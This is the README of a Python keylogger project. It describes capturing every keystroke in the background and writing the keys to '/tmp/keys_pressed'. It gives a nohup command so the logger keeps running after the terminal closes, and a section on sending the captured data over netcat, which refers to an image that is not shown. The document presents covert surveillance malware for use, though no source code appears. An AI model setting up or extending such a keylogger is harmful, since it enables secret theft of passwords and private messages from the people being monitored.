# keylogger

A keylogger in Python

Once run, this listens for keystroke events in the backgroud and logs them all in '/tmp/keys_pressed' file for every thirteen key events.

# Execution

nohup python3 keylogger.py -- runs script in background, even after the terminal is closed

# Send data over netcat

See "./transfer.png"
NO, you won't any metadata in that picture. exiftool -all= "./transfer.png" did the magic.
